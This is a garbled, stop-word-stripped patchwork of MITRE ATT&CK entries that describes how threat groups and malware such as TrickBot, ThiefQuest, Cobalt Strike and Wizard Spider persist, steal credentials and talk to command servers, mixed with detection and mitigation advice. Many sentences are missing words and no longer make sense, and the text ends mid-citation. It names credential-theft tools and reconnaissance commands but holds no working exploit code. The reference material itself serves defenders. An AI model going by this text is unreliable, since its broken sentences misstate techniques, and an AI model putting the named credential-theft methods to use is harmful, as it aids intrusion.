raw XML backdated timestamp June 2, 2016. set creation time files dropped stage exploit match creation time kernel32.dll. Additionally, [APT32](https://attack.mitre.org/groups/G0050) random modify timestamp file storing clientID.(Citation: FireEye APT32 2017)(Citation: ESET OceanLotus Mar 2019)(Citation: ESET OceanLotus macOS April 2019) [Ramsay](https://attack.mitre.org/software/S0458) store collected documents custom container encrypting compressing RC4 WinRAR.(Citation: Eset Ramsay 2020)  [Leviathan](https://attack.mitre.org/groups/G0065) PowerShell execution.(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018)(Citation: CISA AA21-200A APT40 July 2021)(Citation: Accenture MUDCARP March 2019) Monitor newly constructed web-based network connections malicious suspicious destinations (e.g. destinations attributed phishing campaigns). correlation process monitoring command detect anomalous processes execution command arguments (e.g. monitor anomalies files initiate network connections unusual connections initiated regsvr32.exe, rundll.exe, .SCF, HTA, MSI, DLLs, msiexec.exe). [AppleSeed](https://attack.mitre.org/software/S0622) ability rename payload ESTCommon.dll masquerade DLL belonging ESTsecurity.(Citation: Malwarebytes Kimsuky June 2021) [Fox Kitten](https://attack.mitre.org/groups/G0117) Volume Shadow access credential NTDS.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [TrickBot](https://attack.mitre.org/software/S0266) custom crypter leveraging Microsoft’s CryptoAPI encrypt C2 traffic.(Citation: Fidelis TrickBot Oct 2016)Newer versions [TrickBot](https://attack.mitre.org/software/S0266) `bcrypt` encrypt digitally sign responses C2 server. (Citation: Bitdefender Trickbot C2 infra Nov 2020) Ensure safe DLL search mode enabled <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode</code> mitigate risk lsass.exe loads malicious code library. (Citation: DLL Security) [MegaCortex](https://attack.mitre.org/software/S0576) loads <code>injecthelper.dll</code> newly created <code>rundll32.exe</code> process.(Citation: IBM MegaCortex) [XCSSET](https://attack.mitre.org/software/S0658) collects contacts application data files Desktop, Documents, Downloads, Dropbox, WeChat folders.(Citation: trendmicro xcsset xcode project 2020) Monitor unexpected deletions running process (ex: Sysmon EID 5 Windows EID 4689) maliciously modify components victim environment hinder disable defensive mechanisms. [Chimera](https://attack.mitre.org/groups/G0114) <code>net share</code> <code>net view</code> identify network shares interest.(Citation: NCC Chimera January 2021) [Peirates](https://attack.mitre.org/software/S0683) deploy pod mounts node’s root file system, execute command create reverse node.(Citation: Peirates GitHub) [SpeakUp](https://attack.mitre.org/software/S0374) POST requests communicate main C&C server. (Citation: CheckPoint SpeakUp Feb 2019) (Citation: Dell TG-3390)(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Nccgroup Emissary Panda 2018)(Citation: Unit42 Emissary Panda 2019) [Higaisa](https://attack.mitre.org/groups/G0126) HTTPS send data C2 server.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020) [Dragonfly](https://attack.mitre.org/groups/G0035) deleted files operations cleanup, including removing applications deleting screenshots.(Citation: US-CERT TA18-074A) [Astaroth](https://attack.mitre.org/software/S0373) JavaScript perform core functionalities. (Citation: Cofense Astaroth Sept 2018)(Citation: Securelist Brazilian Banking Malware July 2020) [HTTPBrowser](https://attack.mitre.org/software/S0070) DLL side-loading.(Citation: Dell TG-3390) [TA505](https://attack.mitre.org/groups/G0092) lures users links emails attachments. example, [TA505](https://attack.mitre.org/groups/G0092) malware legitimate Word documents, .pdf .lnk files. (Citation: Proofpoint TA505 Sep 2017)(Citation: Proofpoint TA505 June 2018)(Citation: Proofpoint TA505 Jan 2019)(Citation: Cybereason TA505 April 2019)(Citation: ProofPoint SettingContent-ms July 2018)(Citation: Proofpoint TA505 Mar 2018)(Citation: Trend Micro TA505 June 2019)(Citation: Proofpoint TA505 October 2019) [4H RAT](https://attack.mitre.org/software/S0065) capability listing running processes (including loaded modules).(Citation: CrowdStrike Putter Panda) Correlate security systems login user active login session entered building VPN access). [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `query user` `whoami` commands advanced reconnaissance.(Citation: Cybereason OperationCuckooBees 2022) [Small Sieve](https://attack.mitre.org/software/S1035) variations Outlook spellings, "Microsift", file names avoid detection.(Citation: NCSC GCHQ Sieve Jan 2022) [Kwampirs](https://attack.mitre.org/software/S0236) collects list servers command <code>net view</code>.(Citation: Symantec Orangeworm April 2018) [CHOPSTICK](https://attack.mitre.org/software/S0023) capability capture screenshots.(Citation: DOJ GRU Indictment Jul 2018) [HDoor](https://attack.mitre.org/software/S0061) kills anti-virus victim.(Citation: Baumgartner Naikon 2015) compromising victim, [Poseidon Group](https://attack.mitre.org/groups/G0033) discovers running services.(Citation: Kaspersky Poseidon Group) (Citation: ESET Sednit 3) [Volgmer](https://attack.mitre.org/software/S0180) download remote files additional payloads victim's machine.(Citation: US-CERT Volgmer Nov 2017)(Citation: US-CERT Volgmer 2 Nov 2017)(Citation: Symantec Volgmer Aug 2014) [DanBot](https://attack.mitre.org/software/S1014) distributed malicious Excel attachment spearphishing emails.(Citation: SecureWorks August 2019)  [Cadelspy](https://attack.mitre.org/software/S0454) ability record audio compromised host.(Citation: Symantec Chafer Dec 2015) [Torisma](https://attack.mitre.org/software/S0678) packed Iz4 compression.(Citation: McAfee Lazarus Nov 2020) (Citation: F-Secure Dukes)(Citation: ESET Dukes October 2019)(Citation: Secureworks IRON HEMLOCK Profile) Install software write-protected locations. Set directory access controls prevent file writes search paths applications, folders applications standard library folders. [JSS Loader](https://attack.mitre.org/software/S0648) download execute VBScript files.(Citation: CrowdStrike Carbon Spider August 2021) Monitor events VB execution, Office applications spawning processes, usage Windows Script Host (typically cscript.exe wscript.exe). VB execution perform actions effects generate events, depending types monitoring used. Monitor executed commands arguments actions local account creation, user /add /domain. [KONNI](https://attack.mitre.org/software/S0356) command <code>cmd /c tasklist</code> snapshot current processes target machine.(Citation: Medium KONNI Jan 2020)(Citation: Malwarebytes Konni Aug 2021) [Stuxnet](https://attack.mitre.org/software/S0603) delete OLE Automation SQL stored procedures store malicious payloads.(Citation: Symantec W.32 Stuxnet Dossier) anti-spoofing email authentication mechanisms filter messages based validity checks sender domain (using SPF) integrity messages (using DKIM). Enabling mechanisms organization (through policies DMARC) enable recipients (intra-org cross domain) perform message filtering validation.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing) Monitor newly executed processes unusual activity process network so). [SEASHARPEE](https://attack.mitre.org/software/S0185) execute commands victims.(Citation: FireEye APT34 Webinar Dec 2017) deletion instance virtual machine common operations cloud environments. Events viewed isolation, chain behavior lead activities. example, detecting sequence events creation instance, mounting snapshot instance, deletion instance user account suspicious activity.

In AWS, CloudTrail logs capture deletion instance the TerminateInstances event, Azure deletion VM captured Azure activity logs.(Citation: AWS CloudTrail Search) (Citation: Azure Activity Logs) Google's Admin Activity audit logs Cloud Audit logs detect usage of gcloud compute instances delete to delete VM.(Citation: Cloud Audit Logs) [JPIN](https://attack.mitre.org/software/S0201) inject content lsass.exe load module.(Citation: PLATINUM April 2016) [Trojan.Karagany](https://attack.mitre.org/software/S0094) upload, download, execute files victim.(Citation: Symantec Dragonfly)(Citation: Secureworks Karagany July 2019) [ShimRat](https://attack.mitre.org/software/S0444) uninstall compromised hosts, create modify directories, delete, move, copy, rename files.(Citation: FOX-IT 2016 Mofang) [APT41](https://attack.mitre.org/groups/G0096) leveraged sticky establish persistence.(Citation: FireEye APT41 Aug 2019)  [Leviathan](https://attack.mitre.org/groups/G0065) JavaScript create shortcut file Startup folder main backdoor.(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018) Limit credential overlap systems prevent damage credential compromise reduce adversary's ability perform Lateral Movement systems. Time-based evasion occur steps operation occur adversary learns environment. Data events viewed isolation, chain behavior lead activities, lateral movement, based obtained. Detecting actions virtualization sandbox identification difficult depending adversary's implementation monitoring required. Monitoring suspicious processes spawned gather variety perform forms Discovery, short period time, aid detection. Monitor contextual data firewall activity name, policy, status [ZLib](https://attack.mitre.org/software/S0086) ability screenshots compromised system.(Citation: Cylance Dust Storm) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [njRAT](https://attack.mitre.org/software/S0385) modified Windows firewall communicate firewall.(Citation: Fidelis njRAT June 2013)(Citation: Trend Micro njRAT 2018) [Penquin](https://attack.mitre.org/software/S0587) execute command code <code>do_download</code> retrieve remote files C2.(Citation: Leonardo Turla Penquin 2020) [njRAT](https://attack.mitre.org/software/S0385) included base64 encoded executable.(Citation: Trend Micro njRAT 2018) download execute second-stage payload.(Citation: FireEye APT37 Feb 2018) Limit domain admin account permissions domain controllers limited servers. Delegate admin functions separate accounts. (Citation: ADSecurity Kerberos Attacks) [Ursnif](https://attack.mitre.org/software/S0386) strings legitimate files existing folders file, folder, Registry entry names.(Citation: TrendMicro Ursnif Mar 2015) [FIN7](https://attack.mitre.org/groups/G0046) JavaScript scripts perform tasks victim's machine.(Citation: FireEye FIN7 Aug 2018)(Citation: Flashpoint FIN 7 March 2019)(Citation: FireEye FIN7 Aug 2018) [Wizard Spider](https://attack.mitre.org/groups/G0102) Rubeus, MimiKatz Kerberos module, Invoke-Kerberoast cmdlet steal AES hashes.(Citation: DFIR Ryuk's Return October 2020)(Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: DFIR Ryuk 2 Hour Speed November 2020) [Keydnap](https://attack.mitre.org/software/S0276) adds setuid flag binary easily elevate future.(Citation: OSX Keydnap malware) [SharpStage](https://attack.mitre.org/software/S0546) ability download execute additional payloads DropBox API.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020) [LAPSUS$](https://attack.mitre.org/groups/G1004) searched public code repositories exposed credentials.(Citation: MSTIC DEV-0537 Mar 2022) [Machete](https://attack.mitre.org/software/S0409) renamed payloads masquerade legitimate Google Chrome, Java, Dropbox, Adobe Reader Python executables.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014) [Smoke Loader](https://attack.mitre.org/software/S0226) spawns c:\windows\syswow64\explorer.exe replaces executable code memory malware.(Citation: Malwarebytes SmokeLoader 2016)(Citation: Dofoil 2018) [Regin](https://attack.mitre.org/software/S0019) malware platform ICMP communicate infected computers.(Citation: Kaspersky Regin) (Citation: Palo Alto OilRig 2016) file access controls protect folders C:\\Windows\\System32. [Bundlore](https://attack.mitre.org/software/S0482) persist LaunchAgent.(Citation: MacKeeper Bundlore Apr 2019) [Cobalt Strike](https://attack.mitre.org/software/S0154) <code>net localgroup</code> list local system.(Citation: Cobalt Strike Manual 4.3 November 2020) [Hydraq](https://attack.mitre.org/software/S0203) creates services establish persistence.(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: Symantec Hydraq Jan 2010)(Citation: Symantec Hydraq Persistence Jan 2010) [NanoCore](https://attack.mitre.org/software/S0336) capture audio feeds system.(Citation: DigiTrust NanoCore Jan 2017)(Citation: PaloAlto NanoCore Feb 2016) [TinyTurla](https://attack.mitre.org/software/S0668) ability second-stage dropper infect additional malware.(Citation: Talos TinyTurla September 2021) [CoinTicker](https://attack.mitre.org/software/S0369) establishes outbound connections command control ports 2280 1339.(Citation: CoinTicker 2019) [Kerrdown](https://attack.mitre.org/software/S0585) encrypt, encode, compress multiple layers shellcode.(Citation: Unit 42 KerrDown February 2019) [Milan](https://attack.mitre.org/software/S1015) HTTPS communication C2.(Citation: ClearSky Siamesekitten August 2021)(Citation: Kaspersky Lyceum October 2021)(Citation: Accenture Lyceum Targets November 2021) Monitor suspicious network traffic indicative adversary reconnaissance, rapid successions requests indicative crawling quantities requests originating single source (especially source adversary). Analyzing metadata reveal artifacts attributed malicious activity, referer user-agent string HTTP/S fields. [APT28](https://attack.mitre.org/groups/G0007) compromised Office 365 service accounts Global Administrator privileges collect email user inboxes.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [Koadic](https://attack.mitre.org/software/S0250) scan TCP ports target network.(Citation: Github Koadic) Windows 10, implemented protections called Credential Guard protect LSA secrets credentials forms credential dumping. configured default hardware firmware requirements. protect forms credential dumping.(Citation: TechNet Credential Guard)(Citation: GitHub SHB Credential Guard) [APT32](https://attack.mitre.org/groups/G0050) infected victims tricking visiting compromised watering hole websites.(Citation: ESET OceanLotus)(Citation: Volexity Ocean Lotus November 2020) [MoonWind](https://attack.mitre.org/software/S0149) victim hostname, Windows version, RAM amount, drives, screen resolution.(Citation: Palo Alto MoonWind March 2017) (Citation: CheckPoint Volatile Cedar March 2015)(Citation: ClearSky Lebanese Cedar Jan 2021) [ThiefQuest](https://attack.mitre.org/software/S0595) searches <code>/Users/</code> folder executable files. executable, [ThiefQuest](https://attack.mitre.org/software/S0595) prepends file. file executed, [ThiefQuest](https://attack.mitre.org/software/S0595) code executed first. [ThiefQuest](https://attack.mitre.org/software/S0595) creates hidden file, copies original target executable file, executes hidden file maintain appearance normal behavior. (Citation: wardle evilquest partii)(Citation: reed thiefquest ransomware analysis) [jRAT](https://attack.mitre.org/software/S0283) download execute files.(Citation: jRAT Symantec Aug 2018)(Citation: Kaspersky Adwind Feb 2016)(Citation: Symantec Frutas Feb 2013) [Stuxnet](https://attack.mitre.org/software/S0603) injects entire DLL existing, newly created, preselected trusted process.(Citation: Symantec W.32 Stuxnet Dossier) [BONDUPDATER](https://attack.mitre.org/software/S0360) DNS TXT records DNS tunneling protocol command control.(Citation: Palo Alto OilRig Sep 2018) [BendyBear](https://attack.mitre.org/software/S0574) custom RC4 XOR encrypted protocol port 443 C2.(Citation: Unit42 BendyBear Feb 2021) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors [dsquery](https://attack.mitre.org/software/S0105) retrieve subnets Active Directory.(Citation: FoxIT Wocao December 2019) [CHOPSTICK](https://attack.mitre.org/software/S0023) capable performing remote file transmission.(Citation: Crowdstrike DNC June 2016) [Emissary](https://attack.mitre.org/software/S0082) HTTPS C2.(Citation: Lotus Blossom Dec 2015) Monitor newly constructed services/daemons. Data events viewed isolation, chain behavior lead activities, network connections Command Control, learning details environment Discovery, Lateral Movement. [AADInternals](https://attack.mitre.org/software/S0677) send "consent phishing" emails malicious links designed steal users’ access tokens.(Citation: AADInternals Documentation) vendors provide digitally signed operating images validate integrity software platform.  feature prevent detect attempts adversaries compromise image. (Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS) [WellMail](https://attack.mitre.org/software/S0515) identify current username victim system.(Citation: CISA WellMail July 2020) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) compromised Japanese websites Flash exploit perform watering hole attacks.(Citation: Symantec Tick Apr 2016) [Bumblebee](https://attack.mitre.org/software/S1039) backup C2 servers primary server fails.(Citation: Proofpoint Bumblebee April 2022) [Milan](https://attack.mitre.org/software/S1015) query `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography MachineGuid` retrieve machine GUID.(Citation: Accenture Lyceum Targets November 2021) (Citation: CISA AA21-200A APT40 July 2021) [Carbon](https://attack.mitre.org/software/S0335) RSA encryption C2 communications.(Citation: Accenture HyperStack October 2020) [CosmicDuke](https://attack.mitre.org/software/S0050) takes periodic screenshots exfiltrates them.(Citation: F-Secure Cosmicduke) [APT28](https://attack.mitre.org/groups/G0007) weaponized Word documents abusing remote template function retrieve malicious macro. (Citation: Unit42 Sofacy Dec 2018) [APT29](https://attack.mitre.org/groups/G0016) compromised service principals Office 365 environment.(Citation: CrowdStrike StellarParticle January 2022) [SDBbot](https://attack.mitre.org/software/S0461) ability add Registry key establish persistence detects running regular user privilege. (Citation: Proofpoint TA505 October 2019)(Citation: IBM TA505 April 2020) [FatDuke](https://attack.mitre.org/software/S0512) pipes connect machines restricted internet access remote machines infected hosts.(Citation: ESET Dukes October 2019) [PowerLess](https://attack.mitre.org/software/S1012) encrypted channel C2 communications.(Citation: Cybereason PowerLess February 2022) (Citation: FireEye APT41 Aug 2019) [LAPSUS$](https://attack.mitre.org/groups/G1004) created global admin accounts targeted organization's cloud instances gain persistence.(Citation: MSTIC DEV-0537 Mar 2022) Ensure permissions properly set folders sensitive private prevent unintended access. [Tropic Trooper](https://attack.mitre.org/groups/G0081) multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, HttpAddUrl.(Citation: TrendMicro Tropic Trooper 2020) embedded network devices capable storing passwords local accounts plain-text encrypted formats.  Ensure that, available, local passwords encrypted, vendor recommendations. (Citation: Cisco IOS Software Integrity Assurance - Credentials Management) [EnvyScout](https://attack.mitre.org/software/S0634) hidden directories files hide malicious executables.(Citation: MSTIC Nobelium Toolset 2021) [Cobalt Group](https://attack.mitre.org/groups/G0080) variety tools including [Mimikatz](https://attack.mitre.org/software/S0002), [PsExec](https://attack.mitre.org/software/S0029), [Cobalt Strike](https://attack.mitre.org/software/S0154), [SDelete](https://attack.mitre.org/software/S0195).(Citation: PTSecurity Cobalt Dec 2016) [Empire](https://attack.mitre.org/software/S0363) leverage implementation [Mimikatz](https://attack.mitre.org/software/S0002) golden tickets.(Citation: Github PowerShell Empire) [EXOTIC LILY](https://attack.mitre.org/groups/G1011) gained execution victims clicking malicious LNK files contained ISO files, execute hidden DLLs ISO.(Citation: Google EXOTIC LILY March 2022)(Citation: Proofpoint Bumblebee April 2022) [TA505](https://attack.mitre.org/groups/G0092) malware disable Windows Defender.(Citation: Korean FSI TA505 2020) [Anchor](https://attack.mitre.org/software/S0504) HTTPS C2 communications.(Citation: Cyberreason Anchor December 2019) [BloodHound](https://attack.mitre.org/software/S0521) collect user sessions.(Citation: CrowdStrike BloodHound April 2018) [HyperBro](https://attack.mitre.org/software/S0398) ability start service.(Citation: Unit42 Emissary Panda 2019) running root privileges [Launch Agent](https://attack.mitre.org/techniques/T1543/001) installed, [ThiefQuest](https://attack.mitre.org/software/S0595) installs plist file <code>/Library/LaunchDaemons/</code> folder <code>RunAtLoad</code> key set <code>true</code> establishing persistence Launch Daemon. (Citation: wardle evilquest parti) [FatDuke](https://attack.mitre.org/software/S0512) list running processes localhost.(Citation: ESET Dukes October 2019) [APT29](https://attack.mitre.org/groups/G0016) downloaded source code code repositories.(Citation: Internal Solorigate Investigation Blog) Limit privileges user accounts authorized administrators interact service service configurations. Monitor processes enumerate user accounts <code>net.exe</code> <code>net1.exe</code>, executed quick succession.(Citation: Elastic - Koadiac Detection EQL)
 
Information acquired Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001). [Kobalos](https://attack.mitre.org/software/S0641) remove command history compromised hosts.(Citation: ESET Kobalos Feb 2021)	 [Indrik Spider](https://attack.mitre.org/groups/G0119) collected credentials infected systems, including domain accounts.(Citation: Crowdstrike Indrik November 2018) [Imminent Monitor](https://attack.mitre.org/software/S0434) dynamic debugging feature set file attribute hidden.(Citation: QiAnXin APT-C-36 Feb2019) [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), threat actors Dropbox host lure documents first-stage downloader.(Citation: McAfee Sharpshooter December 2018) [Cobalt Strike](https://attack.mitre.org/software/S0154) execute payload remote host PowerShell. technique write data disk.(Citation: cobaltstrike manual)(Citation: Cyberreason Anchor December 2019) [Cobalt Strike](https://attack.mitre.org/software/S0154) [PowerSploit](https://attack.mitre.org/software/S0194) scripting frameworks perform execution.(Citation: Cobalt Strike TTPs Dec 2017)(Citation: CobaltStrike Daddy 2017)(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) [LoudMiner](https://attack.mitre.org/software/S0451) adds plist files naming format <code>com.[random_name].plist</code> <code>/Library/LaunchDaemons</code> folder RunAtLoad KeepAlive set <code>true</code>.(Citation: ESET LoudMiner June 2019) [WastedLocker](https://attack.mitre.org/software/S0612) [cmd](https://attack.mitre.org/software/S0106) execute commands system.(Citation: NCC WastedLocker June 2020) [Shamoon](https://attack.mitre.org/software/S0140) creates service named “ntssrv” execute payload. [Shamoon](https://attack.mitre.org/software/S0140) spread [PsExec](https://attack.mitre.org/software/S0029).(Citation: Palo Alto Shamoon Nov 2016)(Citation: McAfee Shamoon December19 2018) [Exaramel Linux](https://attack.mitre.org/software/S0401) attempt C2 server receives error.(Citation: ANSSI Sandworm January 2021) [Avenger](https://attack.mitre.org/software/S0473) ability browse files directories Program Files Desktop.(Citation: Trend Micro Tick November 2019)  [APT29](https://attack.mitre.org/groups/G0016) file sizes avoid detection.(Citation: SentinelOne NobleBaron June 2021) automatically relaunching forwarding mechanisms recurring intervals (ex: temporal, on-logon, etc.) applying change management firewall rules configurations. [AADInternals](https://attack.mitre.org/software/S0677) enumerate Azure groups.(Citation: AADInternals Documentation) Office-related persistence mechanisms require Registry binaries, files, scripts written disk existing files modified include malicious scripts. Collect events Registry key creation modification Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Page) [Wizard Spider](https://attack.mitre.org/groups/G0102) macros execute PowerShell scripts download malware victim's machines.(Citation: CrowdStrike Grim Spider 2019) PowerShell execute commands laterally victim network.(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: Red Canary Hospital Thwarted Ryuk October 2020) (Citation: GALLIUM December 2019) [Ngrok](https://attack.mitre.org/software/S0508) tunnel RDP services securely internet connections.(Citation: FireEye Maze 2020)(Citation: Cyware Ngrok 2019)(Citation: MalwareBytes Ngrok February 2020)(Citation: Trend Micro Ngrok September 2020) Ensure alerts Protected View enabled.(Citation: Protected View) Monitor telemetry context security software services disabled modified. cloud environments, monitor virtual machine logs status cloud security agents.  [China Chopper](https://attack.mitre.org/software/S0020)'s server component spider authentication portals.(Citation: FireEye Periscope March 2018) [RTM](https://attack.mitre.org/software/S0148) detect running sandbox virtualized analysis environment.(Citation: Unit42 Redaman January 2019)	 [Kimsuky](https://attack.mitre.org/groups/G0094) instrumentor script gather names services running victim's system.(Citation: Talos Kimsuky Nov 2021) [BackConfig](https://attack.mitre.org/software/S0475) ability remove files folders previous infections.(Citation: Unit 42 BackConfig 2020) [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware encrypts C2 traffic RC4 hard-coded key.(Citation: Citizen Lab Stealth Falcon 2016) [Orz](https://attack.mitre.org/software/S0229) download files victim.(Citation: Proofpoint Leviathan Oct 2017) [Sliver](https://attack.mitre.org/software/S0633) support C2 communications DNS.(Citation: Cybersecurity Advisory SVR TTP 2021)(Citation: Bishop Fox Sliver Framework August 2019)(Citation: GitHub Sliver C2 DNS) [WarzoneRAT](https://attack.mitre.org/software/S0670) distributed malicious attachment email.(Citation: Check Warzone Feb 2020)(Citation: Uptycs Confucius APT Jan 2021) [APT28](https://attack.mitre.org/groups/G0007) retrieved internal documents machines victim environments, including [Forfiles](https://attack.mitre.org/software/S0193) stage documents exfiltration.(Citation: Überwachung APT28 Forfiles June 2015)(Citation: DOJ GRU Indictment Jul 2018)(Citation: TrendMicro Pawn Storm 2019)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) Remote access tools built-in features interact Windows API, calling <code> GetLocaleInfoW</code> gather information.(Citation: FBI Ragnar Locker 2020) [HAFNIUM](https://attack.mitre.org/groups/G0125) gathered qualified domain names (FQDNs) targeted Exchange servers victim's environment.(Citation: Volexity Exchange Marauder March 2021) [certutil](https://attack.mitre.org/software/S0160) download files URL.(Citation: TechNet Certutil)(Citation: LOLBAS Certutil) [Stuxnet](https://attack.mitre.org/software/S0603) encodes payload command control servers byte 0xFF XOR key. [Stuxnet](https://attack.mitre.org/software/S0603) 31-byte static byte string XOR data command control servers. servers static key encrypt replies implant.(Citation: Symantec W.32 Stuxnet Dossier)  [PUNCHBUGGY](https://attack.mitre.org/software/S0196) Gzipped saved random temp file exfil.(Citation: Morphisec ShellTea June 2019)	 [Empire](https://attack.mitre.org/software/S0363) limited built-in modules exploiting remote SMB, JBoss, Jenkins servers.(Citation: Github PowerShell Empire) [WINDSHIELD](https://attack.mitre.org/software/S0155) gather victim name.(Citation: FireEye APT32 2017) Monitor processes modify binary headers. [TURNEDUP](https://attack.mitre.org/software/S0199) capable creating reverse shell.(Citation: FireEye APT33 Sept 2017) [Bumblebee](https://attack.mitre.org/software/S1039) spread e-mail campaigns malicious links.(Citation: Proofpoint Bumblebee April 2022)(Citation: Cybereason Bumblebee August 2022) process monitoring monitor execution command parameters binaries involved inhibiting recovery, vssadmin, wbadmin, bcdedit. [KONNI](https://attack.mitre.org/software/S0356) PowerShell download execute specific 64-bit version malware.(Citation: Talos Konni 2017)(Citation: Malwarebytes Konni Aug 2021)  [Patchwork](https://attack.mitre.org/groups/G0040) malicious documents deliver remote execution exploits of. exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, CVE-2015-1641.(Citation: Cymmetria Patchwork)(Citation: Securelist Dropping Elephant)(Citation: Symantec Patchwork)(Citation: PaloAlto Patchwork Mar 2018)(Citation: TrendMicro Patchwork Dec 2017)(Citation: Volexity Patchwork June 2018)(Citation: Unit 42 BackConfig 2020) [KONNI](https://attack.mitre.org/software/S0356) modified registry ComSysApp, Svchost, xmlProv machine gain persistence.(Citation: Medium KONNI Jan 2020)(Citation: Malwarebytes Konni Aug 2021)  [Bad Rabbit](https://attack.mitre.org/software/S0606) enumerates SMB shares internal victim networks.(Citation: ESET Bad Rabbit) Data exfiltration [Okrum](https://attack.mitre.org/software/S0439) channel C2 server.(Citation: ESET Okrum July 2019) [APT28](https://attack.mitre.org/groups/G0007) collected SharePoint services target networks.(Citation: RSAC 2015 Abu Dhabi Stefano Maccaglia) Monitor newly constructed logon behavior systems share accounts, user, admin, service accounts. Examples: account logged multiple systems simultaneously; multiple accounts logged machine simultaneously; accounts logged odd times (ex: user present) business hours. Activity interactive login sessions process ownership accounts execute binaries remote account. Correlate security systems login user active login session entered building VPN access). Configure robust, consistent account activity audit policies enterprise externally accessible services.(Citation: TechNet Audit Policy) [SpeakUp](https://attack.mitre.org/software/S0374) <code>ifconfig -a</code> command. (Citation: CheckPoint SpeakUp Feb 2019) [Empire](https://attack.mitre.org/software/S0363) [PsExec](https://attack.mitre.org/software/S0029) execute payload remote host.(Citation: Github PowerShell Empire) [Tor](https://attack.mitre.org/software/S0183) encapsulates traffic multiple layers encryption, TLS default.(Citation: Dingledine Tor Second-Generation Onion Router) [HOPLIGHT](https://attack.mitre.org/software/S0376) utilized Zlib compression obfuscate communications payload. (Citation: US-CERT HOPLIGHT Apr 2019)	
 [Clambling](https://attack.mitre.org/software/S0660) ability capture store clipboard data.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) [cmd](https://attack.mitre.org/software/S0106) operating system.(Citation: TechNet Dir) Monitor third-party application logging, messaging, artifacts abuse Outlook rules persistence compromised system. SensePost, tool [Ruler](https://attack.mitre.org/software/S0358) carry malicious rules, forms, attacks, released tool detect Ruler usage.(Citation: SensePost NotRuler) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors trojanized documents retrieved remote templates adversary-controlled website.(Citation: Talos Frankenstein June 2019) implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access manipulate backups. [Winnti Windows](https://attack.mitre.org/software/S0141) variant sysprep UAC bypass.(Citation: Novetta Winnti April 2015) [Gamaredon Group](https://attack.mitre.org/groups/G0047) delivered macros tamper Office security settings.(Citation: ESET Gamaredon June 2020)	 [Ajax Security Team](https://attack.mitre.org/groups/G0130) lured victims executing malicious files.(Citation: FireEye Operation Saffron Rose 2013) [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware attempts determine installed version .NET querying Registry.(Citation: Citizen Lab Stealth Falcon 2016) [LiteDuke](https://attack.mitre.org/software/S0513) securely delete files writing random data file.(Citation: ESET Dukes October 2019) [Neoichor](https://attack.mitre.org/software/S0691) identify language compromised host.(Citation: NICKEL December 2021) [HAFNIUM](https://attack.mitre.org/groups/G0125) deployed multiple shells compromised servers including SIMPLESEESHARP, SPORTSBALL, [China Chopper](https://attack.mitre.org/software/S0020), [ASPXSpy](https://attack.mitre.org/software/S0073).(Citation: HAFNIUM March 2020)(Citation: Volexity Exchange Marauder March 2021)(Citation: FireEye Exchange Days March 2021)(Citation: Tarrask scheduled task)    Monitor unexpected deletion instance (ex: instance.delete GCP Audit Logs) [P8RAT](https://attack.mitre.org/software/S0626) send randomly-generated data C2 communication.(Citation: Securelist APT10 March 2021) [CharmPower](https://attack.mitre.org/software/S0674) enumerate drives list contents C: drive victim's computer.(Citation: Check APT35 CharmPower January 2022) [Empire](https://attack.mitre.org/software/S0363) GitHub data exfiltration.(Citation: Github PowerShell Empire) Windows 10, enable Attack Surface Reduction (ASR) rules prevent Office applications creating child processes writing malicious executable content disk. (Citation: win10_asr) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [FIN7](https://attack.mitre.org/groups/G0046) malware created Registry RunOnce establish persistence, items Startup folder.(Citation: FireEye FIN7 April 2017)(Citation: FireEye FIN7 Aug 2018) [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) emails malicious link student targets India.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) [REvil](https://attack.mitre.org/software/S0496) ability identify specific files directories encrypted.(Citation: Kaspersky Sodin July 2019)(Citation: Cylance Sodinokibi July 2019)(Citation: Secureworks GandCrab REvil September 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020)(Citation: Secureworks REvil September 2019) [Socksbot](https://attack.mitre.org/software/S0273) write execute PowerShell scripts.(Citation: TrendMicro Patchwork Dec 